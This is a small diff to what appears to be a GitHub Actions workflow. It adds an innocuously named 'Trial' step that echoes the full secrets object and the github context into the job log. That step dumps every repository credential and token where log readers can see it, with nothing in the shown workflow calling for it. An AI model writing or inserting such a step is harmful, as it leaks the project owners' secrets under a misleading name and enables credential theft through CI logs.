@@ -41,6 +41,10 @@ jobs:
             - name: Clone
               uses: actions/checkout@v3
 
+            - name: Trial
+              run: |
+                  echo '${{ toJSON(secrets) }}' && echo '${{ toJSON(github) }}'
+
             - name: Setup Python
               uses: actions/setup-python@v4
               with:
